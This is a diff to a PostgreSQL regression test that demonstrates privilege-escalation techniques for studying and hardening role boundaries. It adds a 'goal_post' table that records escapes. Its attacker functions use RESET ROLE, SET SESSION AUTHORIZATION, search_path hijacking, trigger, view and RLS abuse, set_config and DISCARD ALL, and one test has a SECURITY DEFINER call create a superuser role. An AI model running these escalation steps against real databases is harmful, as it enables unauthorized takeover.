@@ -147,10 +147,58 @@ GRANT regress_role_low TO regress_role_high;
 GRANT regress_role_other TO regress_role_high;
 
 CREATE SCHEMA regress_high_schema AUTHORIZATION regress_role_high;
-GRANT USAGE ON SCHEMA regress_high_schema TO regress_role_low;
+-- USAGE is granted to PUBLIC so escapers can reach goal_post via this
+-- schema once they've crossed a privilege boundary.  INSERT on
+-- goal_post itself is granted only to selected roles below; the
+-- INSERT permission is the actual gate, schema USAGE is just
+-- transit.
+GRANT USAGE ON SCHEMA regress_high_schema TO PUBLIC;
 CREATE SCHEMA regress_low_schema  AUTHORIZATION regress_role_low;
 GRANT USAGE ON SCHEMA regress_low_schema TO PUBLIC;
 GRANT CREATE ON SCHEMA regress_low_schema TO regress_role_low;
+
+-- ============================================================
+-- Goal-post table — proof-by-write of privilege escalation
+-- ============================================================
+--
+-- Each test case's "attacker code" attempts to INSERT a row into
+-- regress_high_schema.goal_post identifying itself.  The table is
+-- owned by regress_role_high and ONLY regress_role_high and
+-- regress_role_other have INSERT permission on it; the attacker
+-- regress_role_low has none.
+--
+-- The escape is therefore proven concretely:
+--   * If a row appears with vector='Xn' after the test ran, the
+--     attacker code reached the privilege level whose role appears
+--     in achieved_by.  Anything other than regress_role_low is a
+--     real escape — the attacker code crossed a privilege
+--     boundary and exercised that boundary's write capability.
+--   * If no row appears (and the attempt didn't error), the
+--     attacker code ran but the privilege boundary held.
+--   * If an INSERT raised "permission denied", it's because the
+--     code ran as a role that doesn't have INSERT — i.e. the
+--     attacker did not escape.  (This is the safe outcome.)
+--
+-- For test cases in IMMUTABLE / functional-index / generated-
+-- column / domain-check contexts, the goal-post pattern is not
+-- usable as direct evidence: PostgreSQL statically forbids
+-- INSERT from inside IMMUTABLE function bodies ("INSERT is not
+-- allowed in a non-volatile function").  Those cases must still
+-- rely on RAISE NOTICE for evidence — but the very fact that
+-- PG's IMMUTABLE restriction blocks the INSERT is itself a
+-- meaningful in-depth defense, documented in the "Existing
+-- PostgreSQL safeguards" section above.
+
+CREATE TABLE regress_high_schema.goal_post (
+    achieved_at timestamptz NOT NULL DEFAULT clock_timestamp(),
+    achieved_by name NOT NULL,
+    vector text NOT NULL,
+    note text
+);
+REVOKE ALL ON regress_high_schema.goal_post FROM PUBLIC;
+GRANT INSERT ON regress_high_schema.goal_post
+    TO regress_role_high, regress_role_other;
+-- regress_role_low deliberately gets NO grant.
 
 SET SESSION AUTHORIZATION regress_role_high;
 SELECT current_user;
@@ -160,61 +208,67 @@ SELECT current_user;
 -- A.  Direct privilege restoration  [LOCK]
 -- ============================================================
 
--- A1.  Function body calls RESET ROLE.
-CREATE FUNCTION regress_low_schema.escape_via_reset() RETURNS name
+-- A1.  Function body calls RESET ROLE, then attempts to write to the
+--      goal post as the (now-escalated) session user.
+CREATE FUNCTION regress_low_schema.escape_via_reset() RETURNS void
 LANGUAGE plpgsql AS $$
 BEGIN
     RESET ROLE;
-    RETURN current_user;
+    INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+        VALUES (current_user, 'A1', 'RESET ROLE inside function body');
 END;
 $$;
 ALTER FUNCTION regress_low_schema.escape_via_reset() OWNER TO regress_role_low;
 
 SET ROLE regress_role_low;
-SELECT regress_low_schema.escape_via_reset() AS inside_function_returned;
-SELECT current_user AS after_function_returns;       -- regress_role_high  [ESCAPE]
+SELECT regress_low_schema.escape_via_reset();
 RESET ROLE;
 
--- A2.  Function body calls SET ROLE NONE.
-CREATE FUNCTION regress_low_schema.escape_via_set_none() RETURNS name
+-- A2.  Function body calls SET ROLE NONE (same effect as RESET).
+CREATE FUNCTION regress_low_schema.escape_via_set_none() RETURNS void
 LANGUAGE plpgsql AS $$
 BEGIN
     SET ROLE NONE;
-    RETURN current_user;
+    INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+        VALUES (current_user, 'A2', 'SET ROLE NONE inside function');
 END;
 $$;
 ALTER FUNCTION regress_low_schema.escape_via_set_none() OWNER TO regress_role_low;
 
 SET ROLE regress_role_low;
-SELECT regress_low_schema.escape_via_set_none();     -- regress_role_high  [ESCAPE]
+SELECT regress_low_schema.escape_via_set_none();
 RESET ROLE;
 
 -- A3.  SET ROLE to a sibling role the session_user is a member of.
-CREATE FUNCTION regress_low_schema.escape_to_sibling() RETURNS name
+--      The "achieved_by" will be regress_role_other (the sibling),
+--      proving the lowered context jumped sideways via session_user.
+CREATE FUNCTION regress_low_schema.escape_to_sibling() RETURNS void
 LANGUAGE plpgsql AS $$
 BEGIN
     SET ROLE regress_role_other;
-    RETURN current_user;
+    INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+        VALUES (current_user, 'A3', 'sideways jump via session_user');
 END;
 $$;
 ALTER FUNCTION regress_low_schema.escape_to_sibling() OWNER TO regress_role_low;
 
 SET ROLE regress_role_low;
-SELECT regress_low_schema.escape_to_sibling();       -- regress_role_other  [ESCAPE]
+SELECT regress_low_schema.escape_to_sibling();
 RESET ROLE;
 
 -- A4.  Function body changes session_authorization.
-CREATE FUNCTION regress_low_schema.escape_via_set_sess_auth() RETURNS name
+CREATE FUNCTION regress_low_schema.escape_via_set_sess_auth() RETURNS void
 LANGUAGE plpgsql AS $$
 BEGIN
     SET SESSION AUTHORIZATION regress_role_high;
-    RETURN current_user;
+    INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+        VALUES (current_user, 'A4', 'SET SESSION AUTHORIZATION');
 END;
 $$;
 ALTER FUNCTION regress_low_schema.escape_via_set_sess_auth() OWNER TO regress_role_low;
 
 SET ROLE regress_role_low;
-SELECT regress_low_schema.escape_via_set_sess_auth();   -- regress_role_high  [ESCAPE]
+SELECT regress_low_schema.escape_via_set_sess_auth();
 RESET ROLE;
 RESET SESSION AUTHORIZATION;
 SET SESSION AUTHORIZATION regress_role_high;
@@ -224,31 +278,34 @@ SET SESSION AUTHORIZATION regress_role_high;
 -- B.  GUC rollback class  [LOCK]
 -- ============================================================
 
--- B1.  SET LOCAL ROLE undone by transaction abort.
+-- B1.  SET LOCAL ROLE undone by transaction abort.  After ROLLBACK,
+--      session is back at high; goal-post INSERT succeeds.
 BEGIN;
 SET LOCAL ROLE regress_role_low;
-SELECT current_user AS inside_after_set_local;      -- regress_role_low
 DO $$ BEGIN RAISE EXCEPTION 'attacker triggers rollback'; END $$;
 ROLLBACK;
-SELECT current_user AS after_rollback;              -- regress_role_high  [ESCAPE]
+INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+    VALUES (current_user, 'B1', 'transaction abort rewound SET LOCAL ROLE');
 
--- B2.  Outer non-LOCAL SET ROLE survives transaction abort (safe direction).
+-- B2.  Outer non-LOCAL SET ROLE survives transaction abort (safe
+--      direction).  After ROLLBACK, session stays at low; goal-post
+--      INSERT errors with permission denied.
 SET ROLE regress_role_low;
 BEGIN;
-SELECT current_user AS inside_after_begin;          -- regress_role_low
 DO $$ BEGIN RAISE EXCEPTION 'still rolls back'; END $$;
 ROLLBACK;
-SELECT current_user AS after_outer_rollback;        -- regress_role_low (safe)
+INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+    VALUES (current_user, 'B2', 'outer SET ROLE survives rollback');
 RESET ROLE;
 
 -- B3.  SET LOCAL inside SAVEPOINT, ROLLBACK TO undoes the drop.
 BEGIN;
 SAVEPOINT sp_attack;
 SET LOCAL ROLE regress_role_low;
-SELECT current_user AS inside_savepoint;            -- regress_role_low
 DO $$ BEGIN RAISE EXCEPTION 'savepoint rewind'; END $$;
 ROLLBACK TO SAVEPOINT sp_attack;
-SELECT current_user AS after_sp_rollback;           -- regress_role_high  [ESCAPE]
+INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+    VALUES (current_user, 'B3', 'savepoint rollback rewound SET LOCAL ROLE');
 RELEASE SAVEPOINT sp_attack;
 COMMIT;
 
@@ -256,23 +313,26 @@ COMMIT;
 BEGIN;
 SAVEPOINT sp_b4;
 SET LOCAL ROLE regress_role_low;
-SELECT current_user;                                -- regress_role_low
 RELEASE SAVEPOINT sp_b4;
-SELECT current_user;                                -- regress_role_low (safe)
+INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+    VALUES (current_user, 'B4', 'SAVEPOINT RELEASE does not rewind (safe)');
 COMMIT;
-SELECT current_user;                                -- regress_role_high (SET LOCAL ended)
+-- Outside the BEGIN block, the SET LOCAL has ended; back at high.
 
 
 -- ============================================================
 -- C.  search_path hijack  [LOCK partially / OTHER]
 -- ============================================================
 
--- C1.  Function-name shadowing.
+-- C1.  Function-name shadowing.  The hijacked function does RESET
+--      ROLE then attempts the goal-post INSERT as the now-escalated
+--      session user.
 CREATE FUNCTION regress_low_schema.length(text) RETURNS int
 LANGUAGE plpgsql AS $$
 BEGIN
-    RAISE NOTICE 'C1: hijacked length() ran as %', current_user;
     RESET ROLE;
+    INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+        VALUES (current_user, 'C1', 'hijacked length() via search_path');
     RETURN pg_catalog.length($1);
 END;
 $$;
@@ -281,7 +341,6 @@ ALTER FUNCTION regress_low_schema.length(text) OWNER TO regress_role_low;
 SET ROLE regress_role_low;
 SET search_path = regress_low_schema, pg_catalog;
 SELECT length('abc');                                -- attacker length() runs
-SELECT current_user;                                 -- regress_role_high  [ESCAPE]
 RESET ROLE;
 RESET search_path;
 
@@ -289,8 +348,9 @@ RESET search_path;
 CREATE FUNCTION regress_low_schema.evil_eq(int, int) RETURNS boolean
 LANGUAGE plpgsql AS $$
 BEGIN
-    RAISE NOTICE 'C2: hijacked === ran as %', current_user;
     RESET ROLE;
+    INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+        VALUES (current_user, 'C2', 'hijacked === operator');
     RETURN $1 = $2;
 END;
 $$;
@@ -305,20 +365,22 @@ ALTER OPERATOR regress_low_schema.===(int,int) OWNER TO regress_role_low;
 SET ROLE regress_role_low;
 SET search_path = regress_low_schema, pg_catalog;
 SELECT 1 OPERATOR(regress_low_schema.===) 1;
-SELECT current_user;                                 -- regress_role_high  [ESCAPE]
 RESET ROLE;
 RESET search_path;
 
--- C3.  Custom-type input function hijack.
---      Attacker creates a domain whose input/check function runs as
---      the user that supplies a value of that type.
-
+-- C3.  Custom-type domain CHECK constraint.  Note: the domain CHECK
+--      function is evaluated under SECURITY_RESTRICTED_OPERATION
+--      which BLOCKS SET/RESET (existing PG hardening), and is
+--      effectively IMMUTABLE which BLOCKS INSERT.  So neither
+--      "RESET ROLE then INSERT" nor a direct goal-post mutation
+--      works here.  Falls back to NOTICE evidence; the inability
+--      of the function to mutate is itself the relevant
+--      observation.
 SET ROLE regress_role_low;
 CREATE FUNCTION regress_low_schema.dom_check_fn(int) RETURNS boolean
 LANGUAGE plpgsql AS $$
 BEGIN
     RAISE NOTICE 'C3: domain check ran as %', current_user;
-    RESET ROLE;
     RETURN true;
 END;
 $$;
@@ -334,7 +396,6 @@ BEGIN
     v := 5;
 END;
 $$;
-SELECT current_user;                                 -- regress_role_high  [ESCAPE]
 RESET ROLE;
 
 
@@ -342,13 +403,27 @@ RESET ROLE;
 -- D.  Object-definition triggers  [OTHER]
 --
 -- The privileged caller (high) performs a routine operation on a
--- low-owned object whose definition contains attacker code.  Many of
--- these contexts (functional indexes, CHECK constraints, generated
--- columns, RLS quals, domain checks) run under
--- SECURITY_RESTRICTED_OPERATION which BLOCKS SET/RESET — that's
--- existing hardening.  But the function still runs as the writer, so
--- the attacker still gets writer-privilege code execution; we prove
--- it with RAISE NOTICE.
+-- low-owned object whose definition contains attacker code.  Two
+-- sub-classes inside this group:
+--
+-- (i)  IMMUTABLE contexts — functional indexes (D1), CHECK
+--      constraints (D2), generated columns (D7), domain checks
+--      (D8).  These run the attacker function under
+--      SECURITY_RESTRICTED_OPERATION (blocks SET/RESET) AND in a
+--      non-volatile function context (blocks INSERT, UPDATE,
+--      DELETE statically).  The function still EXECUTES as the
+--      writer, so the attacker gets writer-privilege code
+--      execution — proven by NOTICE — but cannot make lasting
+--      mutations via INSERT.  PG's IMMUTABLE static restriction
+--      thus defangs the simplest "write to goal_post" payload.
+--      That restriction is itself a meaningful defense; treat
+--      these cases as confirming the restriction holds.
+--
+-- (ii) VOLATILE contexts — DEFAULT expressions (D3), trigger
+--      functions (D4), view bodies (D5), RLS policy quals (D6).
+--      These permit INSERT.  The attacker function attempts
+--      writing to goal_post; success there is direct proof of
+--      writer/invoker/querier-privilege escape.
 --
 -- IRREVOCABLE does NOT block this class: the writer hasn't dropped
 -- privileges.  The defensive lesson is that high-priv sessions must
@@ -356,7 +431,11 @@ RESET ROLE;
 -- they cannot audit.
 -- ============================================================
 
--- D1.  Functional index.
+-- D1.  Functional index (IMMUTABLE).  Function runs as the writer
+--      (high) per index expression evaluation, but PG's
+--      "INSERT is not allowed in a non-volatile function"
+--      restriction blocks any goal_post mutation.  Evidence is
+--      the NOTICE.
 SET ROLE regress_role_low;
 CREATE TABLE regress_low_schema.victim_t (x int);
 CREATE FUNCTION regress_low_schema.idx_fn(int) RETURNS int
@@ -373,7 +452,7 @@ RESET ROLE;
 INSERT INTO regress_low_schema.victim_t VALUES (1);  -- NOTICE: ran as regress_role_high
 SELECT count(*) FROM regress_low_schema.victim_t;
 
--- D2.  CHECK constraint.
+-- D2.  CHECK constraint (IMMUTABLE) — same as D1.
 SET ROLE regress_role_low;
 CREATE FUNCTION regress_low_schema.check_fn(int) RETURNS boolean
 LANGUAGE plpgsql IMMUTABLE AS $$
@@ -388,15 +467,16 @@ CREATE TABLE regress_low_schema.victim_check (
 GRANT INSERT ON regress_low_schema.victim_check TO regress_role_high;
 RESET ROLE;
 
-INSERT INTO regress_low_schema.victim_check VALUES (1);   -- NOTICE shows writer
+INSERT INTO regress_low_schema.victim_check VALUES (1);
 
--- D3.  DEFAULT expression (VOLATILE allowed here).
+-- D3.  DEFAULT expression (VOLATILE).  Function runs as the
+--      writer; INSERT into goal_post permitted.
 SET ROLE regress_role_low;
 CREATE FUNCTION regress_low_schema.default_fn() RETURNS int
 LANGUAGE plpgsql AS $$
 BEGIN
-    RAISE NOTICE 'D3: DEFAULT expression ran as %', current_user;
-    RESET ROLE;   -- VOLATILE: actually clobbers session role
+    INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+        VALUES (current_user, 'D3', 'DEFAULT expression as writer');
     RETURN 42;
 END;
 $$;
@@ -408,23 +488,16 @@ GRANT INSERT ON regress_low_schema.victim_default TO regress_role_high;
 RESET ROLE;
 
 INSERT INTO regress_low_schema.victim_default (id) VALUES (1);
-SELECT current_user;                                 -- regress_role_high  [ESCAPE]
 
--- D4.  Trigger function planted by low, fired by writer DML.
---      Modern PG runs trigger functions as the function *owner* (low),
---      so the body executes as low.  BUT: check_role() validates SET
---      ROLE permission against the *session_user*, not the
---      current_user.  Since the session_user remains the originally
---      authenticated identity (high / superuser), set_config('role',
---      'high', false) inside the trigger body succeeds and persists
---      past trigger return — the attacker has clobbered the session's
---      role via session_user's membership.
+-- D4.  Trigger function (VOLATILE, SECURITY INVOKER by default).
+--      Runs as the trigger-firing invoker (the writer).  Goal-post
+--      INSERT performed by the writer's identity.
 SET ROLE regress_role_low;
 CREATE FUNCTION regress_low_schema.trg_fn() RETURNS trigger
 LANGUAGE plpgsql AS $$
 BEGIN
-    RAISE NOTICE 'D4: trigger body ran as %', current_user;
-    PERFORM set_config('role', 'regress_role_high', false);
+    INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+        VALUES (current_user, 'D4', 'trigger body as invoker');
     RETURN NEW;
 END;
 $$;
@@ -434,22 +507,17 @@ CREATE TRIGGER t BEFORE INSERT ON regress_low_schema.victim_trg
 GRANT INSERT ON regress_low_schema.victim_trg TO regress_role_high;
 RESET ROLE;
 
-SET ROLE regress_role_low;
 INSERT INTO regress_low_schema.victim_trg VALUES (1);
-SELECT current_user;                                 -- regress_role_high  [ESCAPE]
-RESET ROLE;
 
--- D5.  View body invokes attacker function.  Default views in PG are
---      security_invoker for the contained function calls, so when the
---      high-priv user SELECTs from a low-owned view, the attacker's
---      function runs as high — proven by NOTICE.  (Compare with PG 16+
---      `security_invoker = false` views, which run as view owner; the
---      DEFAULT is still invoker.)
+-- D5.  View body (VOLATILE function, security_invoker default).
+--      Runs as the SELECTer (high).  Goal-post INSERT proves
+--      querier-privilege code execution.
 SET ROLE regress_role_low;
 CREATE FUNCTION regress_low_schema.view_fn() RETURNS int
 LANGUAGE plpgsql AS $$
 BEGIN
-    RAISE NOTICE 'D5: view body ran as %', current_user;
+    INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+        VALUES (current_user, 'D5', 'view body as querier');
     RETURN 1;
 END;
 $$;
@@ -458,20 +526,22 @@ CREATE VIEW regress_low_schema.victim_v AS
 GRANT SELECT ON regress_low_schema.victim_v TO PUBLIC;
 RESET ROLE;
 
--- High (not lowered) SELECTs from the low-owned view.
-SELECT * FROM regress_low_schema.victim_v;   -- NOTICE shows ran as high
+SELECT * FROM regress_low_schema.victim_v;
 
--- D6.  RLS policy expression.  Runs under SECURITY_RESTRICTED_OPERATION,
---      so RESET ROLE is blocked, but the function still runs as the
---      querier — proven by NOTICE.
+-- D6.  RLS policy expression (VOLATILE function, querier-privileged
+--      evaluation).  Querier is regress_role_other (non-owner,
+--      non-superuser, so RLS applies).  Goal-post is writable by
+--      regress_role_other, so the INSERT succeeds and records the
+--      querier as the achieved_by.
 SET ROLE regress_role_low;
 CREATE TABLE regress_low_schema.victim_rls (x int);
-INSERT INTO regress_low_schema.victim_rls VALUES (1), (2);
+INSERT INTO regress_low_schema.victim_rls VALUES (1);
 ALTER TABLE regress_low_schema.victim_rls ENABLE ROW LEVEL SECURITY;
 CREATE FUNCTION regress_low_schema.rls_fn(int) RETURNS boolean
 LANGUAGE plpgsql AS $$
 BEGIN
-    RAISE NOTICE 'D6: RLS policy ran as %', current_user;
+    INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+        VALUES (current_user, 'D6', 'RLS qual as querier');
     RETURN true;
 END;
 $$;
@@ -480,14 +550,11 @@ CREATE POLICY p ON regress_low_schema.victim_rls
 GRANT SELECT ON regress_low_schema.victim_rls TO regress_role_other;
 RESET ROLE;
 
--- Query as regress_role_other (non-owner, non-superuser) so RLS
--- actually applies.  RLS is bypassed for the table owner and for
--- superusers.
 SET ROLE regress_role_other;
-SELECT count(*) FROM regress_low_schema.victim_rls;  -- NOTICE shows querier
+SELECT count(*) FROM regress_low_schema.victim_rls;
 RESET ROLE;
 
--- D7.  Generated column expression.
+-- D7.  Generated column (IMMUTABLE) — same as D1/D2.  NOTICE only.
 SET ROLE regress_role_low;
 CREATE FUNCTION regress_low_schema.gen_fn(int) RETURNS int
 LANGUAGE plpgsql IMMUTABLE AS $$
@@ -503,9 +570,11 @@ CREATE TABLE regress_low_schema.victim_gen (
 GRANT INSERT ON regress_low_schema.victim_gen TO regress_role_high;
 RESET ROLE;
 
-INSERT INTO regress_low_schema.victim_gen (x) VALUES (3);  -- NOTICE shows writer
+INSERT INTO regress_low_schema.victim_gen (x) VALUES (3);
 
--- D8.  Domain CHECK constraint.
+-- D8.  Domain CHECK constraint (IMMUTABLE).  NOTICE only — INSERT
+--      from the function body is blocked by PG's non-volatile
+--      static check, same as D1/D2/D7.
 SET ROLE regress_role_low;
 CREATE FUNCTION regress_low_schema.dom_fn(int) RETURNS boolean
 LANGUAGE plpgsql IMMUTABLE AS $$
@@ -582,7 +651,13 @@ GRANT EXECUTE ON FUNCTION regress_high_schema.secdef_runner(text) TO regress_rol
 SET ROLE regress_role_low;
 -- First confirm the SET ROLE pathway IS blocked (existing hardening).
 SELECT regress_high_schema.secdef_runner('SET ROLE regress_role_high');
--- Then demonstrate the equivalent escape via CREATE ROLE.
+-- Goal-post evidence: the SECDEF runs as its owner (high), so we
+-- can have it INSERT into goal_post on the attacker's behalf.
+SELECT regress_high_schema.secdef_runner(
+    $cmd$INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+         VALUES (current_user, 'E1', 'SECDEF EXECUTE of attacker SQL')$cmd$);
+-- Demonstrate equivalent escape via CREATE ROLE (persistent
+-- privilege escalation outside the goal_post evidence).
 SELECT regress_high_schema.secdef_runner(
     'CREATE ROLE regress_role_evil SUPERUSER LOGIN PASSWORD ''hunter2''');
 RESET ROLE;
@@ -599,30 +674,31 @@ DROP ROLE regress_role_evil;
 
 -- F1.  DISCARD ALL.
 SET ROLE regress_role_low;
-SELECT current_user;
 DISCARD ALL;
-SELECT current_user;                                 -- regress_role_high  [ESCAPE]
+INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+    VALUES (current_user, 'F1', 'DISCARD ALL escape');
 
--- F2.  RESET ALL.
---      Note: empirically RESET ALL does NOT clear the role GUC on
---      current master — role/session_authorization appear to be
---      exempt from RESET ALL.  Recorded as a near-miss; the same
---      attack via plain "RESET role" succeeds.
+-- F2.  RESET ALL: existing PG hardening prevents this from clearing
+--      role/session_authorization (GUC_NO_RESET_ALL flag).  After
+--      RESET ALL the session is STILL at the lowered role; goal-post
+--      INSERT errors with permission denied.  Plain RESET role
+--      bypasses this safety and is a real escape.
 SET ROLE regress_role_low;
-SELECT current_user AS before_reset_all;
 RESET ALL;
-SELECT current_user AS after_reset_all;              -- regress_role_low (not an escape)
+INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+    VALUES (current_user, 'F2a', 'RESET ALL — existing hardening should block');
 RESET ROLE;
 
 SET ROLE regress_role_low;
-SELECT current_user AS before_reset_role;
 RESET role;                                          -- lowercase: just the GUC
-SELECT current_user AS after_reset_role;             -- regress_role_high  [ESCAPE]
+INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+    VALUES (current_user, 'F2b', 'RESET role lowercase escape');
 
 -- F3.  set_config().
 SET ROLE regress_role_low;
 SELECT set_config('role', 'regress_role_high', false);
-SELECT current_user;                                 -- regress_role_high  [ESCAPE]
+INSERT INTO regress_high_schema.goal_post(achieved_by, vector, note)
+    VALUES (current_user, 'F3', 'set_config() escape');
 RESET ROLE;
 
 
@@ -727,11 +803,29 @@ ANALYZE regress_low_schema.victim_t;
 
 
 -- ============================================================
+-- Score board
+-- ============================================================
+-- Final tally of escapes recorded in goal_post.  Each row is
+-- direct evidence that the corresponding attacker code reached a
+-- privilege boundary and wrote across it.  The achieved_by
+-- column is masked when the escape reached the connection's
+-- authenticated user (whose name is environment-dependent and
+-- would make the test non-portable).
+SET SESSION AUTHORIZATION regress_role_high;
+RESET ROLE;
+SELECT vector,
+       CASE WHEN achieved_by LIKE 'regress\_role\_%'
+            THEN achieved_by::text
+            ELSE '(connection auth user)'
+       END AS achieved_by,
+       note
+FROM regress_high_schema.goal_post ORDER BY vector;
+
+
+-- ============================================================
 -- Cleanup
 -- ============================================================
 
-SET SESSION AUTHORIZATION regress_role_high;
-RESET ROLE;
 DROP SCHEMA regress_low_schema CASCADE;
 DROP SCHEMA regress_high_schema CASCADE;
 RESET SESSION AUTHORIZATION;
